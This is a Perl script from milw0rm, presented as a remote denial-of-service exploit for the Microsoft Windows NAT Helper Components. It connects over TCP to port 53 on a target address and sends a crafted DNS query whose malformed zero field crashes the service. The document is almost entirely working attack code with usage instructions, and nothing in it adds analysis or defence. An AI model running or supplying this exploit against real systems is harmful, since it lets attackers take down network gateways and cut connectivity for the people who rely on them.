<html><head><title>MS Windows NAT Helper Components Remote DoS Exploit (perl)</title></head><pre>#!/usr/bin/perl
##
## Microsoft Windows NAT Helper Components Remote DoS Exploit (2)
## **************************************************************
##
## .details
## --------
## Exploit(192.168.0.2) --&gt; Microsoft NAT(192.168.0.1) --&gt; [..Internet..]
##
## .info
## -----
## code by x82 &lt;x82_ [at] bk [dot] ru&gt;
## bug by h07  &lt;h07 [at] interia [dot] pl&gt;
##
## .greetz
## -------
## ... goes out to triple6, wolf, lux2, EaTh, darkkilla, 2letterman .. ;)
##
##

use warnings;
use diagnostics;
use strict;

use IO::Socket;


my $host = $ARGV[0]; # 192.168.0.1
my $port = 53; # standard port
my $payload =
# by h07
&quot;\x6c\xb6&quot;.
&quot;\x01\x00&quot;.
&quot;\x00\x00&quot;.
&quot;\x00\x00&quot;.
&quot;\x00\x00&quot;.
&quot;\x00\x00&quot;. # &lt;-- Bug is here 0x0000
&quot;\x03\x77\x77\x77&quot;.
&quot;\x06\x67\x6f\x6f&quot;.
&quot;\x67\x6c\x65\x03&quot;.
&quot;\x63\x6f\x6d\x00&quot;.
&quot;\x00\x01&quot;.
&quot;\x00\x01&quot;;

my $length = length($payload);

if((! $host || $host !~ /^\d{1,3}(\.\d{1,3}){3}$/))
{
	print &quot;\n----------------------------------------------------------------------\n&quot;;
	print &quot;Microsoft Windows NAT Helper Components Remote DoS Exploit\n&quot;;
	print &quot;exploit by x82 &lt;x82_ [at] bk [dot] ru&gt;\n&quot;;
	print &quot;bug discovered by h07 &lt;h07 [at] interia [dot] pl&gt;\n&quot;;
	print &quot;----------------------------------------------------------------------&quot;;
	print &quot;\n&quot;;
	print &quot;usage: perl $0 192.168.0.1\n&quot;;
	exit;
}

my $socket = IO::Socket::INET-&gt;new ( Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; $host, PeerPort =&gt; $port);
unless ($socket) { die &quot;[-] Can\'t connect to $host&quot; }

print &quot;\n&quot;;
print &quot;[+] connection established\n&quot;;
print &quot;[*] Sending payload ...&quot; . &quot;(size: $length)\n&quot;;
sleep(5);

print $socket $payload;

print &quot;[+] ok - payload sent\n&quot;;


## 29.10.2006

# milw0rm.com [2006-10-30]</pre></html>